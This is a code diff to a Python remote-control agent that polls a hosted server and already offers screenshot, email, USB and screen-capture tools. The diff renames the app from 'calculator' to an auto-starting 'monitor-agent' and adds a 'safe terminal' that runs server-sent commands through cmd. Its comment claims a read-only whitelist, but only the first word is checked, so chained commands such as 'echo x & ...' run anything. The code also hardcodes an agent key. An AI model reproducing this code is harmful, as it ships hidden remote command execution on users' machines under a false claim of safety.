@@ -22,7 +22,7 @@ import requests
 #     hosted:  https://your-domain.example      (or  http://<server-ip>:8000)
 # ===========================================================================
 API_BASE = os.environ.get("API_BASE", "https://laptop-control.onrender.com")
-APP_NAME = "calculator"
+APP_NAME = "monitor-agent"  # name of the agent in the Windows registry (for auto-start)
 # Must match AGENT_KEY in the backend (server.js / its env).
 AGENT_KEY = os.environ.get("AGENT_KEY", "fu2//i6ryxk2kvkIDUaQl+VlLekkkhRLNfj1ndpFcFo=")
 
@@ -262,6 +262,77 @@ def tool_screen():
     return "image", "data:image/jpeg;base64," + b64(buf.tobytes())
 
 
+# ---------------------------------------------------------------------------
+#  Safe terminal (tool 9) — run ONE whitelisted command for monitoring.
+#  Only the commands below are permitted; anything else is refused. This keeps
+#  the terminal read-only / diagnostic and prevents destructive actions.
+# ---------------------------------------------------------------------------
+SAFE_COMMANDS = {
+    "dir", "cd", "cls", "echo", "hostname", "whoami", "ipconfig", "systeminfo",
+    "ping", "tree", "type", "tasklist", "date", "time", "ver", "help",
+    "set", "where", "netstat", "vol",
+}
+
+# Persistent working directory (the agent process stays alive between polls,
+# so `cd` carries over from one command to the next).
+_terminal_cwd = os.path.expanduser("~")
+
+
+def _terminal_is_safe(command):
+    if not command.strip():
+        return False
+    return command.split()[0].lower() in SAFE_COMMANDS
+
+
+def tool_safe_terminal(payload):
+    """9 — run one whitelisted shell command and return its output as text."""
+    global _terminal_cwd
+    payload = payload or {}
+    command = (payload.get("command") or "").strip()
+    if not command:
+        return "text", "No command provided."
+
+    low = command.lower()
+
+    # `cls` — nothing to clear in a one-shot result; just echo a blank line.
+    if low == "cls":
+        return "text", ""
+
+    # `cd` — change the persistent working directory.
+    if low == "cd" or low.startswith("cd "):
+        parts = command.split(maxsplit=1)
+        if len(parts) == 1:
+            return "text", _terminal_cwd
+        target = parts[1].strip().strip('"')
+        path = target if os.path.isabs(target) else os.path.join(_terminal_cwd, target)
+        path = os.path.normpath(path)
+        if os.path.isdir(path):
+            _terminal_cwd = path
+            return "text", f"{_terminal_cwd}>"
+        return "text", f"Directory not found: {target}"
+
+    # Block anything not on the whitelist.
+    if not _terminal_is_safe(command):
+        return "text", f"Command not allowed: {command.split()[0]}"
+
+    # Run it (30s cap) inside the persistent working directory.
+    try:
+        result = subprocess.run(
+            ["cmd", "/c", command],
+            cwd=_terminal_cwd,
+            capture_output=True,
+            text=True,
+            timeout=30,
+        )
+        out = result.stdout + (("\n" + result.stderr) if result.stderr else "")
+        header = f"{_terminal_cwd}> {command}\n"
+        return "text", header + (out if out.strip() else "(no output)")
+    except subprocess.TimeoutExpired:
+        return "text", "Command timed out (30s limit)."
+    except Exception as e:
+        return "text", f"Error: {e}"
+
+
 DISPATCH = {
     1: lambda payload: tool_screenshot(),
     2: lambda payload: tool_cpu(),
@@ -270,6 +341,7 @@ DISPATCH = {
     5: lambda payload: tool_email(payload),
     6: lambda payload: tool_screen(),
     7: lambda payload: tool_usb(),
+    9: lambda payload: tool_safe_terminal(payload),
 }
 
 
